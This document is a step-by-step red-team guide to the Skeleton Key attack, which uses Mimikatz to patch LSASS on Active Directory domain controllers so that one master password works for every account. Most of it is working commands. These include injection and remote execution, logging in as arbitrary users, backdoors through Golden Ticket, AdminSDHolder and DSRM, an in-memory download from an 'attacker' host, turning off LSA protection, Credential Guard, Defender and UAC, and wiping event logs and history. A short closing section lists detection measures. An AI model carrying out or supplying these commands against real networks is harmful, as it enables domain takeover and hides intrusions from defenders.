# Skeleton Key Attack Guide - Master Password Injection

## Table of Contents
1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Attack Flow](#attack-flow)
4. [Step-by-Step Instructions](#step-by-step-instructions)
5. [Living Off The Land Alternatives](#living-off-the-land-alternatives)
6. [Detection Evasion](#detection-evasion)
7. [Troubleshooting](#troubleshooting)
8. [Cleanup](#cleanup)

---

## Overview

### What is Skeleton Key?

**Skeleton Key** is an advanced in-memory attack technique that patches the LSASS (Local Security Authority Subsystem Service) process on Domain Controllers to accept a "master password" for authentication while simultaneously allowing legitimate passwords to continue working.

### How It Works

The attack modifies the authentication routine in LSASS memory:

```
Normal Authentication:
User provides password → LSASS verifies against AD → Allow/Deny

Skeleton Key Authentication:
User provides password → LSASS checks:
  ├─ Is it the master password? → ALLOW
  └─ Otherwise, verify against AD → Allow/Deny
```

### Why is Skeleton Key Powerful?

**Advantages:**
- **Universal Access**: Works for ANY domain user account
- **Stealthy**: No failed login attempts, no account lockouts
- **Non-Invasive**: Original passwords still work (users unaware)
- **No AD Modifications**: Nothing changed in Active Directory
- **In-Memory Only**: Disappears on DC reboot (no forensic artifacts)

**Use Cases:**
- Persistent domain-wide access
- Privilege escalation to any account
- Lateral movement to any system
- Bypassing MFA (if implemented on AD level)

---

## Prerequisites

### Required Permissions
- **Domain Admin** privileges
- OR **Local Admin** on Domain Controller
- Access to LSASS process

### Required Tools

**Mimikatz (Primary Method)**
```powershell
# Download from official source
# https://github.com/gentilkiwi/mimikatz/releases

# Verify version
.\mimikatz.exe "version" "exit"
```

**Alternative: Custom LSASS Patcher**
- Requires deep understanding of Windows authentication
- Requires knowledge of LSASS internals
- Not recommended (use Mimikatz)

### Target Requirements
- Windows Server 2008 R2 or later
- Domain Controller role
- LSASS protection NOT enabled (or bypass available)
- Credential Guard NOT enabled (or bypass available)

### Check for Protections

```powershell
# Check LSA Protection (RunAsPPL)
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue

# If Value = 1, LSA Protection is enabled (blocks Skeleton Key)

# Check Credential Guard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object -ExpandProperty SecurityServicesRunning

# If contains "1" (Credential Guard), more difficult to inject
```

---

## Attack Flow

```
Phase 1: Preparation
    ↓
1. Verify Domain Admin access
2. Identify target Domain Controller
3. Check DC for LSA/Credential Guard protections
4. Obtain Mimikatz

Phase 2: Injection
    ↓
5. Get SYSTEM/DEBUG privileges
6. Access LSASS process memory
7. Locate authentication routine
8. Patch memory to accept master password
9. Verify injection successful

Phase 3: Utilization
    ↓
10. Authenticate as any user with master password
11. Maintain persistence until DC reboot
12. Re-inject after maintenance windows

Phase 4: Cleanup (Optional)
    ↓
13. Reboot DC to remove patch
14. Clear event logs (optional)
```

---

## Step-by-Step Instructions

### Method 1: Using Mimikatz (Recommended)

#### Basic Injection

```powershell
# Step 1: Run Mimikatz on Domain Controller
# (Copy mimikatz.exe to DC or use PS Remoting)

# Option A: Direct execution on DC
# RDP to DC, open admin PowerShell
cd C:\Tools
.\mimikatz.exe

# Option B: Remote execution via PS Remoting
$session = New-PSSession -ComputerName DC01
Copy-Item .\mimikatz.exe -Destination C:\Windows\Temp\ -ToSession $session

Invoke-Command -Session $session -ScriptBlock {
    cd C:\Windows\Temp
    .\mimikatz.exe "privilege::debug" "misc::skeleton /password:Mimikatz123!" "exit"
}
```

#### Full Mimikatz Commands

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::skeleton /password:YourMasterPassword
Skeleton Key injected into LSASS
Master Password: YourMasterPassword

mimikatz # exit
```

**That's it!** The Skeleton Key is now active.

#### Test Authentication

```powershell
# From attacker machine, authenticate as ANY user
$cred = Get-Credential
# Username: DOMAIN\Administrator
# Password: YourMasterPassword (the skeleton key password!)

# Test access
Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { whoami }

# Should return: DOMAIN\administrator
```

### Method 2: Using Script (Automated)

```powershell
# Basic usage
.\SkeletonKey-Attack.ps1 -DomainController DC01 `
                         -MasterPassword "Mimikatz123!" `
                         -MimikatzPath "C:\Tools\mimikatz.exe"

# With authentication test
.\SkeletonKey-Attack.ps1 -DomainController DC01 `
                         -MasterPassword "SkeletonKey2024!" `
                         -MimikatzPath "C:\Tools\mimikatz.exe" `
                         -TestAuth `
                         -TestUser "Administrator"

# With verbose output
.\SkeletonKey-Attack.ps1 -DomainController DC01 `
                         -MasterPassword "RedTeam123!" `
                         -Verbose
```

### Authentication Examples

Once Skeleton Key is injected, authenticate as any user:

#### Example 1: PowerShell Remoting

```powershell
# Authenticate as Domain Admin
$cred = Get-Credential DOMAIN\Administrator
# Enter master password: Mimikatz123!

$session = New-PSSession -ComputerName DC01 -Credential $cred
Invoke-Command -Session $session -ScriptBlock {
    Get-ADUser -Filter * | Select-Object -First 10
}
```

#### Example 2: RDP Access

```powershell
# RDP as any user
mstsc /v:DC01

# At login prompt:
Username: DOMAIN\Administrator
Password: Mimikatz123!  (master password)

# Login succeeds! Real admin doesn't know you authenticated as them
```

#### Example 3: Network Share Access

```powershell
# Map network drive as any user
net use Z: \\DC01\C$ /user:DOMAIN\Administrator Mimikatz123!

# Access granted!
```

#### Example 4: SMB Authentication

```powershell
# Access admin shares
dir \\DC01\C$
# Authenticates with current context

# Or specify credentials
$cred = Get-Credential DOMAIN\krbtgt
# Password: Mimikatz123! (master password)

New-PSDrive -Name "K" -PSProvider FileSystem -Root "\\DC01\SYSVOL" -Credential $cred
```

---

## Living Off The Land Alternatives

### Manual LSASS Patching (Educational)

**Warning:** This is extremely complex and error-prone. Use Mimikatz in practice.

The manual process would involve:

1. **Get debug privileges**
2. **Open LSASS process handle**
3. **Locate authentication function** (varies by Windows version)
4. **Read memory at function address**
5. **Modify assembly instructions** to always return success for master password
6. **Write patched code back to memory**

**Why this is impractical without Mimikatz:**
- Authentication routine addresses change per Windows version/patch
- Requires reverse engineering of lsass.exe
- One wrong byte = DC crash
- Mimikatz does all heavy lifting reliably

### Alternative Persistence (If Skeleton Key Unavailable)

If LSA Protection or Credential Guard blocks Skeleton Key:

**Option 1: DCSync + Golden Ticket**
```powershell
# Extract KRBTGT hash
mimikatz # lsadump::dcsync /user:krbtgt

# Create Golden Ticket (unlimited access, long persistence)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:{hash} /ptt
```

**Option 2: AdminSDHolder Backdoor**
```powershell
# Modify AdminSDHolder to give backdoor user persistent admin rights
$user = Get-ADUser backdoor
$acl = Get-Acl "AD:\CN=AdminSDHolder,CN=System,$((Get-ADDomain).DistinguishedName)"

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $user.SID,
    "GenericAll",
    "Allow"
)

$acl.AddAccessRule($ace)
Set-Acl -Path "AD:\CN=AdminSDHolder,CN=System,$((Get-ADDomain).DistinguishedName)" -AclObject $acl
```

**Option 3: DSRM Backdoor**
```powershell
# Enable DSRM password for network authentication
# Allows login as local admin even if AD unavailable

Invoke-Command -ComputerName DC01 -ScriptBlock {
    # Set DSRM network authentication
    Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" `
                     -Name "DsrmAdminLogonBehavior" `
                     -Value 2 `
                     -Type DWord

    # Now DSRM password can be used over network
    # Password rarely changes
}

# Authenticate using DSRM account
$cred = Get-Credential ".\Administrator"  # Local admin, not domain!
```

---

## Detection Evasion

### What Blue Teams Look For

**Common Skeleton Key Detection Methods:**

1. **Memory Forensics**: Dump LSASS and search for Mimikatz patterns
2. **Behavioral Detection**: Same password authenticating as multiple users
3. **LSASS Integrity Checks**: Compare LSASS hash to known good
4. **Event Log Patterns**: Unusual authentication success patterns
5. **Mimikatz Artifacts**: Strings/signatures in LSASS memory

### Evasion Techniques

#### 1. Obfuscate Mimikatz

```powershell
# Use obfuscated/recompiled Mimikatz
# Invoke-Mimikatz from PowerShell Empire (in-memory, no disk artifacts)

IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton /password:MyPass" "exit"'
```

#### 2. Use Realistic Master Password

```powershell
# BAD: Obvious master password
misc::skeleton /password:mimikatz
misc::skeleton /password:password123

# GOOD: Realistic, complex password
misc::skeleton /password:C0mp1ex!P@ssw0rd2024
misc::skeleton /password:Winter2024$ecure!
```

#### 3. Limit Usage

```powershell
# Don't abuse skeleton key
# Use sparingly to avoid pattern detection

# BAD: Authenticate as 50 different users in 5 minutes
# GOOD: Authenticate as 2-3 critical users per week
```

#### 4. Blend with Legitimate Traffic

```powershell
# Authenticate during business hours when admins are active
# Don't authenticate at 3 AM on weekends

# Check normal authentication patterns first
Get-EventLog -LogName Security -InstanceId 4624 -Newest 1000 |
    Group-Object -Property TimeGenerated |
    Measure-Object -Property Count -Average
```

#### 5. Clean Event Logs (Advanced)

```powershell
# Clear successful authentication events (risky - obvious)
Invoke-Command -ComputerName DC01 -ScriptBlock {
    # This is very obvious to defenders!
    wevtutil cl Security
}

# Better: Selectively remove specific events
# (Requires custom log manipulation - complex)
```

---

## Troubleshooting

### Error: "Skeleton Key injection failed"

**Cause 1: LSA Protection Enabled**

```powershell
# Check if enabled
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL

# If Value = 1, LSA Protection is ON

# Solution 1: Disable via registry (requires reboot)
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 0
Restart-Computer -Force

# Solution 2: Use Mimikatz driver to bypass
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
```

**Cause 2: Credential Guard Enabled**

```powershell
# Check status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# If Credential Guard running, Skeleton Key won't work easily
# Solution: Disable Credential Guard (requires reboot)

# Via Group Policy:
# Computer Configuration > Administrative Templates > System > Device Guard
# Turn off Virtualization Based Security

# Or via registry:
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0
```

**Cause 3: Antivirus Blocking Mimikatz**

```powershell
# Solution 1: Disable AV temporarily
Set-MpPreference -DisableRealtimeMonitoring $true

# Solution 2: Add exclusion
Add-MpPreference -ExclusionPath "C:\Tools"

# Solution 3: Use obfuscated Mimikatz
# Recompile with different strings/signatures
```

### Error: "Access Denied" to LSASS

**Cause:** Insufficient privileges

```powershell
# Solution 1: Ensure running as admin
# Right-click PowerShell > Run as Administrator

# Solution 2: Get debug privileges
mimikatz # privilege::debug

# If this fails, you're not admin or UAC is blocking

# Solution 3: Disable UAC temporarily
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
```

### Skeleton Key Not Working After Injection

**Test if injection succeeded:**

```powershell
# Try authenticating with master password
$cred = Get-Credential DOMAIN\testuser
# Enter master password

Test-ComputerSecureChannel -Credential $cred

# If fails, injection didn't work
# If succeeds, skeleton key is active
```

**Verify LSASS patch:**

```powershell
# Check LSASS is running
Get-Process lsass -ComputerName DC01

# Check recent LSASS restarts (would clear skeleton key)
Get-Process lsass -ComputerName DC01 | Select-Object StartTime

# If StartTime is recent, DC was rebooted
```

---

## Cleanup

### Removing Skeleton Key

**Method 1: Reboot DC (Cleanest)**

```powershell
# Schedule reboot during maintenance window
Restart-Computer -ComputerName DC01 -Force

# Or schedule for specific time
Invoke-Command -ComputerName DC01 -ScriptBlock {
    shutdown /r /t 3600 /c "Scheduled maintenance reboot"
}
```

**Method 2: Restart LSASS (Risky)**

```powershell
# WARNING: Restarting LSASS logs off all users and can cause issues!

Invoke-Command -ComputerName DC01 -ScriptBlock {
    # This will force reboot anyway
    Stop-Process -Name lsass -Force
}
```

**Method 3: Wait for Maintenance**

```powershell
# Skeleton Key persists until DC reboots
# Plan around maintenance windows

# Check next scheduled maintenance
Get-ScheduledTask -CimSession DC01 | Where-Object {
    $_.TaskName -like "*reboot*" -or $_.TaskName -like "*update*"
}
```

### Clear Artifacts

```powershell
# Remove Mimikatz from DC
Invoke-Command -ComputerName DC01 -ScriptBlock {
    Remove-Item C:\Windows\Temp\mimikatz.exe -Force -ErrorAction SilentlyContinue
    Remove-Item C:\Temp\*.exe -Force -ErrorAction SilentlyContinue
}

# Clear PowerShell history
Invoke-Command -ComputerName DC01 -ScriptBlock {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
}

# Clear relevant event logs (obvious to defenders)
# Only do in authorized red team exercise
wevtutil cl Security
wevtutil cl System
```

---

## Detection Testing

### Expected Behavior

**From Blue Team Perspective:**

**Event Logs (DC):**
- **Event ID 4624**: Successful logons for multiple users (with skeleton key password)
- **Event ID 4672**: Special privileges assigned (if user is admin)
- **NO Event ID 4625**: No failed logon attempts (all succeed!)

**Unusual Patterns:**
- Same source IP authenticating as many different users
- Authentication success without corresponding password change
- High-privilege accounts authenticating from unusual locations

### Memory Forensics Detection

**How Defenders Can Detect:**

```powershell
# On DC, dump LSASS memory
procdump.exe -ma lsass.exe lsass.dmp

# Analyze dump for Mimikatz signatures
strings lsass.dmp | Select-String -Pattern "mimikatz","skeleton"

# Use volatility or rekall for advanced analysis
```

**What They'll Find:**
- Mimikatz strings in memory
- Modified authentication routine
- Unusual code patterns in LSASS

### Purple Team Discussion Points

After exercise:

1. **Did blue team detect Skeleton Key injection?**
2. **Were unusual authentication patterns noticed?**
3. **Did anyone analyze LSASS memory?**
4. **How long did skeleton key persist undetected?**

**Recommendations for Blue Team:**

**Prevention:**
- Enable LSA Protection (RunAsPPL)
- Enable Credential Guard
- Restrict Domain Admin logons to dedicated jump servers
- Monitor LSASS process integrity

**Detection:**
- Baseline normal authentication patterns per user
- Alert on same password for multiple privileged accounts
- Monitor LSASS for suspicious memory patterns
- Regular memory forensics on DCs
- Alert on Mimikatz-related event IDs
- Monitor for debug privilege usage on DCs

**Event Monitoring:**
```powershell
# Alert on debug privilege granted
Event ID 4673 (Security)
  Privilege: SeDebugPrivilege
  Process Name: *mimikatz* OR unusual process

# Alert on LSASS access
Event ID 4656 (Security)
  Object Name: *lsass.exe
  Access: PROCESS_VM_WRITE
```

---

## References

- [MITRE ATT&CK T1558 - Steal or Forge Kerberos Tickets (includes Skeleton Key)](https://attack.mitre.org/techniques/T1558/)
- [Dell SecureWorks: Skeleton Key Malware Analysis](https://www.secureworks.com/research/skeleton-key-malware-analysis)
- [Mimikatz misc::skeleton Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-misc)
- [Microsoft: Configuring LSA Protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

---

**CRITICAL WARNING:**

Skeleton Key is an EXTREMELY powerful technique. Improper use can:
- Crash Domain Controller (domain-wide authentication failure)
- Corrupt LSASS process
- Cause Blue Screen of Death on DC
- Require emergency DC recovery

**Only use in authorized testing environments with:**
- Proper authorization
- Tested backup/restore procedures
- Isolated test domain (NEVER production)
- Understanding of AD recovery procedures

**This is for RED TEAM TRAINING ONLY. Unauthorized use is illegal.**
